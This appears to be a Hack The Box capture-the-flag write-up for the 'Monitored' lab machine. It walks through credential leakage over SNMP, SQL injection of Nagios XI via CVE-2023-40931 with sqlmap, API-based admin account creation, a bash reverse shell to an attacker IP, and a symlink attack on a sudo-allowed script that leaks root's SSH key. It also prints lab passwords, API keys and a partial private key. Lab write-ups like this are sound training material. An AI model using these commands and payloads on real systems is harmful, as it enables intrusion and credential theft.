# Monitored

![monitored_machine_info_card](./assets/monitored_machine_info_card.png)

Machine: [https://app.hackthebox.com/machines/Monitored](https://app.hackthebox.com/machines/Monitored)

Created by: [TheCyberGeek](https://app.hackthebox.com/users/114053) & [ruycr4ft](https://app.hackthebox.com/users/1253217)

Difficulty: Medium

OS: Linux

## Machine Info

Monitored is a medium-difficulty Linux machine that features a Nagios instance. Credentials for the service are obtained via the SNMP protocol, which reveals a username and password combination provided as command-line parameters. Using the Nagios API, an authentication token for a disabled account is obtained, which leads to access to the application dashboard. From there, a SQL injection (`[CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)`) is abused to obtain an administrator API key, with which a new admin account is created and used to run arbitrary commands on the instance, leading to a reverse shell. Finally, `sudo` access to a bash script is abused to read the `root` user SSH key and authenticate as `root`.

## Enumeration

We start to add the host `monitored.htb` to `/etc/hosts`, to use instead of IP.

```shell
labad
min@labmachine:~/mailing$ sudo bash -c 'echo "<machine IP>  monitored.htb" >> /etc/hosts'
```

### Nmap

```shell
labadmin@labmachine:~/monitored$ nmap -p- --min-rate 1000 -oN monitored-default-nmap.log monitored.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 22:47 PDT
Nmap scan report for monitored.htb (10.10.11.248)
Host is up (0.19s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 76.23 seconds

labadmin@labmachine:~/monitored$ nmap -p 22,80,389,443,5667 -sV -sC -oN monitored-sv-sc-nmap.log monitored.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 22:48 PDT
Nmap scan report for monitored.htb (10.10.11.248)
Host is up (0.19s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Debian)
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_ssl-date: TLS randomness does not represent time
|_http-title: Nagios XI
5667/tcp open  tcpwrapped
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
```

The nmap reveal several open TCP ports.

- 22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
- 80/tcp   open  http       Apache httpd 2.4.56
- 389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
- 443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
- 5667/tcp open  tcpwrapped

We also notice that port 80 redirects to `https://nagios.monitored.htb/` so we add that to `/etc/hosts` as well.

```shell
<machine IP>  monitored.htb  nagios.monitored.htb
```

We also do a scan for open UDP ports.

```shell
labadmin@labmachine:~/monitored$ sudo nmap -p- -sU --min-rate 1000 --open -oN monitored-su-nmap.log monitored.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 22:58 PDT
Warning: 10.10.11.248 giving up on port because retransmission cap hit (10).
Nmap scan report for monitored.htb (10.10.11.248)
Host is up (0.25s latency).
Not shown: 64812 open|filtered udp ports (no-response), 721 closed udp ports (port-unreach)
PORT    STATE SERVICE
123/udp open  ntp
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 722.63 seconds
```

It identifies two open ports.

- 123/udp open  ntp
- 161/udp open  snmp


### HTTPS port 443

Navigating to `https://nagios.monitored.htb/` takes us to an instance if Nagios Xi.

[https://www.nagios.com/products/nagios-xi/](https://www.nagios.com/products/nagios-xi/)

![monitored1](./assets/monitored1.png)

Click `Access Nagios XI` and it takes us to a login page.

![monitored2](./assets/monitored2.png)

Without the credentials or identified version we don't come any further.

### SNMP port 161

```shell
labadmin@labmachine:~/monitored$ snmpwalk -v 2c -c public nagios.monitored.htb | tee snmpwalk.log
iso.3.6.1.2.1.1.1.0 = STRING: "Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64"
...[OMITTED]...
iso.3.6.1.2.1.25.4.2.1.5.612 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
...[OMITTED]...
```

The output contains quite some data, but we found an execution of `check_host.sh`. And it takes arguments that potentially can be user credentials for user `svc` with password `XjH7VCehowpR1xZB`.

We try login on the web page but it does not work.

![monitored3](./assets/monitored3.png)

### Nagios Xi API - Bypassing Disabled Account

Searching around on the internet we found this post on how to authenticate and access the APi.

[https://support.nagios.com/forum/viewtopic.php?p=310411#p310411](https://support.nagios.com/forum/viewtopic.php?p=310411#p310411)

The authentication is successful and we get a token.

```shell
labadmin@labmachine:~/monitored$ curl -X POST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' --data 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "d8891c30c329e7dce9cbbef7b8a6e21d25e53be4",
    "valid_min": 5,
    "valid_until": "Thu, 16 May 2024 02:59:08 -0400"
}
```

Further the forum post shows examples of how to use the token. By add it as parameter `token=<TOKEN>` in the request.

```shell
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=TOKEN' > image.png
```

We try adding the API token to the web page URL `https://nagios.monitored.htb//nagiosxi/index.php?token=d8891c30c329e7dce9cbbef7b8a6e21d25e53be4`. And we are in as user `svc`, we could authenticate the web page using the token.

![monitored4](./assets/monitored4.png)

In bottom left of page we identify the version to `Nagios XI 5.11.0`.

And searching the internet we find the following vulnerability.

[https://outpost24.com/blog/nagios-xi-vulnerabilities/](https://outpost24.com/blog/nagios-xi-vulnerabilities/)


### SQL Injection 

Using the information from the blog we will continue to exploit this vulnerability.

```text
1. SQL Injection in Banner acknowledging endpoint (CVE-2023-40931)
Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.

When a user acknowledges a banner, a POST request is sent to `/nagiosxi/admin/banner_message-ajaxhelper.php` with the POST data consisting of the intended action and message ID – `action=acknowledge banner message&id=3`.

The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the `xi_session` and `xi_users` table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.

This vulnerability does not require the existence of a valid announcement banner ID, meaning it can be exploited by an attacker at any time.
```

Now we start burpsuite and in the browser we navigate to `view / new view` and submit.

![monitored5](./assets/monitored5.png)

This will get us a POST request in the burpsuite that we send to the repeater.

![monitored6](./assets/monitored6.png)

This request we update according to the blog post. Adding a `'` to the end to test for the SQL Injection.

![monitored7](./assets/monitored7.png)

The SQL error we see in the response indicates we can do SQL injection.

Using `sqlmap` we enumerate the database.

It has 2 databases 

```shell
labadmin@labmachine:~/monitored$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id -cookie="nagiosxi=jmn8jdqa8896k6pqkuov3lnqde" --dbs --threads=10
...[OMITTED]...
available databases [2]:
[*] information_schema
[*] nagiosxi
...[OMITTED]...
```

Starting off by dumping the `nagiosxi`

```shell
labadmin@labmachine:~/monitored$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id -cookie="nagiosxi=jmn8jdqa8896k6pqkuov3lnqde" --threads=10 -D nagiosxi --tables
...[OMITTED]...
[22 tables]
+-----------------------------+
| xi_auditlog                 |
| xi_auth_tokens              |
| xi_banner_messages          |
| xi_cmp_ccm_backups          |
| xi_cmp_favorites            |
| xi_cmp_nagiosbpi_backups    |
| xi_cmp_scheduledreports_log |
| xi_cmp_trapdata             |
| xi_cmp_trapdata_log         |
| xi_commands                 |
| xi_deploy_agents            |
| xi_deploy_jobs              |
| xi_eventqueue               |
| xi_events                   |
| xi_link_users_messages      |
| xi_meta                     |
| xi_mibs                     |
| xi_options                  |
| xi_sessions                 |
| xi_sysstat                  |
| xi_usermeta                 |
| xi_users                    |
+-----------------------------+
```

The `xi_users` table sounds interesting and we dump that one.

```shell
labadmin@labmachine:~/monitored$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id -cookie="nagiosxi=jmn8jdqa8896k6pqkuov3lnqde" --threads=10 -D nagiosxi -T xi_users --dump
...[OMITTED]...
Database: nagiosxi
Table: xi_users
[2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1715841407   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 6              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+

...[OMITTED]...
```

We find credentials for nagiosadmin. We failed to crack the password hash, but we got the API key.

And searching the internet we found this exploit.

[https://www.exploit-db.com/exploits/44969](https://www.exploit-db.com/exploits/44969)


## FOOTHOLD

With the exploit we will be able to create admin user.

```shell
labadmin@labmachine:~/monitored$ curl -k --silent 'http://nagios.monitored.htb/nagiosxi/api/v1/system/user&apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' --data 'username=duser&pa
ssword=qwerQWER1234!@#$&name=USER&email=user@localhost&auth_level=admin'
{"success":"User account duser was added successfully!","user_id":7}
```

After login in we need to acknowledge user agreements and after that update the password.

![monitored8](./assets/monitored8.png)

![monitored9](./assets/monitored9.png)

And we have login as admin.

![monitored10](./assets/monitored10.png)

### Reverse shell

We now navigate our way to `Configure > Core Config Manager > Commands`. Here we click `Add New` and define a command. And we will create reverse shell command.

```shell
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.25/8000 0>&1'
```

![monitored11](./assets/monitored11.png)

Then we click `Save` and finish by clicking `Apply Configuration` at the bottom.

Now we start a local `netcat` listener.

```shell
labadmin@labmachine:~/monitored$ nc -lvnp 8000
Listening on 0.0.0.0 8000
```

Finally, we go to `Monitoring > Hosts` and click on `localhost`. Here we select the `duser_command` command in the `Check command` drop down list and finish by clicking `Run Check Command`.

![monitored12](./assets/monitored12.png)

And we got reverse shell as nagios.

```shell
labadmin@labmachine:~/monitored$ nc -lvnp 8000
Listening on 0.0.0.0 8000
Connection received on 10.10.11.248 55796
bash: cannot set terminal process group (20632): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ whoami
whoami
nagios
nagios@monitored:~$
```

We get the user flag in user home directory.

```shell
nagios@monitored:~$ ls -l
ls -l
total 8
-rw-r--r-- 1 nagios nagios 131 May 16 00:07 cookie.txt
-rw-r----- 1 root   nagios  33 May 16 00:02 user.txt
nagios@monitored:~$ cat user.txt
cat user.txt
...[OMITTED]...
```

##  Privilege Escalation

### Enumeration as nagios

Checking `sudo -l` we find that `nagios` have permission execute several scripts as sudo.

```shell
nagios@monitored:~$ sudo -l
sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

Reading the source code for getprofile.sh, we see its functionality is to collect various logs and configuration files into a user defined directory. And the script takes storage directory location as argument.

```shell
 nagios@monitored:~$ cat /usr/local/nagiosxi/scripts/components/getprofile.sh
cat /usr/local/nagiosxi/scripts/components/getprofile.sh
#!/bin/bash

# GRAB THE ID
folder=$1
if [ "$folder" == "" ]; then
    echo "You must enter a folder name/id to generate a profile."
    echo "Example: ./getprofile.sh <id>"
    exit 1
fi

# Clean the folder name
folder=$(echo "$folder" | sed -e 's/[^[:alnum:]|-]//g')

...[OMITTED]...

echo "Getting phpmailer.log..."
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
fi

...[OMITTED]...

echo "Zipping logs directory..."

## temporarily change to that directory, zip, then leave
(
    ts=$(date +%s)
    cd /usr/local/nagiosxi/var/components/profile
    mv "$folder" "profile-$ts"
    zip -r profile.zip "profile-$ts"
    rm -rf "profile-$ts"
    mv -f profile.zip ../
)

echo "Backup and Zip complete!"
```

It checks if `/usr/local/nagiosxi/tmp/phpmailer.log` exists and `tail` the last 100 lines into the user defined directory inside `/usr/local/nagiosxi/var/components/profile/`

This is vulnerable due to it do not sanity-check the `$folder` which open the possibility for `Symbolic Link Attacks`

To be successful we need access to`/usr/local/nagiosxi/tmp/phpmailer.log` which we have.

```shell
nagios@monitored:~$ ls -l /usr/local/nagiosxi/tmp/phpmailer.log
ls -l /usr/local/nagiosxi/tmp/phpmailer.log
-rw-r--r-- 1 nagios nagios 0 Nov 10  2023 /usr/local/nagiosxi/tmp/phpmailer.log
```

Checking for root and SSH key in sshd_config.

```shell
nagios@monitored:~$ cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
<ig | grep -E 'PermitRootLogin|PubkeyAuthentication'
PermitRootLogin prohibit-password
PubkeyAuthentication yes
# the setting of "PermitRootLogin without-password".
nagios@monitored:~$
```

We see root user can login using SSH key if it is generated and available in root directory.

## Exploitation

Checking for root and SSH key in sshd_config.

```shell
nagios@monitored:~$  cat /etc/ssh/sshd_config | grep -E 'PermitRootLogin|PubkeyAuthentication'
<ig | grep -E 'PermitRootLogin|PubkeyAuthentication'
PermitRootLogin prohibit-password
PubkeyAuthentication yes
# the setting of "PermitRootLogin without-password".
nagios@monitored:~$
```

We see root user can login using SSH key if it is generated and available in root directory.

We start by creating a symlink named `phpmailer.log` in `/usr/local/nagiosxi/tmp/`. And point it to the root user SSH private key.

```shell
nagios@monitored:~$ rm /usr/local/nagiosxi/tmp/phpmailer.log
rm /usr/local/nagiosxi/tmp/phpmailer.log
nagios@monitored:~$ ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
<t/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log
nagios@monitored:~$
```

And we finish of by executing `getprofile.sh` with an arbitrary directory name.

```shell
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
<r/local/nagiosxi/scripts/components/getprofile.sh 1
mv: cannot stat '/usr/local/nagiosxi/tmp/profile-1sudo.html': No such file or directory
-------------------Fetching Information-------------------
Please wait.......
Creating system information...
...[OMITTED]...
```

We now copy the zip file to `/tmp` to process and to get the ssh key.

```shell
nagios@monitored:~$ cp /usr/local/nagiosxi/var/components/profile.zip /tmp/
cp /usr/local/nagiosxi/var/components/profile.zip /tmp/
nagios@monitored:~$ cd /tmp
cd /tmp
nagios@monitored:/tmp$
```

Unzip file.

```shell
nagios@monitored:/tmp$ unzip profile.zip
unzip profile.zip
...[OMITTED]...
  inflating: profile-1715851496/phpmailer.log
...[OMITTED]...
```

And we got the key.

```shell
nagios@monitored:/tmp$ cat profile-1715851496/phpmailer.log
cat profile-1715851496/phpmailer.log
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
...[OMITTED]...
```

Now we add this key to a file on our local attack machine and chmod the file permission to 600.

```
labadmin@labmachine:~/monitored$ ls -l monitored_root_id_rsa
-rw------- 1 labadmin labadmin 2602 May 16 02:31 monitored_root_id_rsa

labadmin@labmachine:~/monitored$ chmod 600 monitored_root_id_rsa
```

Using this key we can now login to target server as root.

```shell
labadmin@labmachine:~/monitored$ ssh -i monitored_root_id_rsa root@monitored.htb
...[OMITTED]...
root@monitored:~# whoami
root
```

And we get the root flag in root directory.

```shell
root@monitored:~# pwd
/root
root@monitored:~# ls -l
total 4
-rw-r----- 1 root root 33 May 16 00:02 root.txt
root@monitored:~# cat root.txt
...[OMITTED]...
```
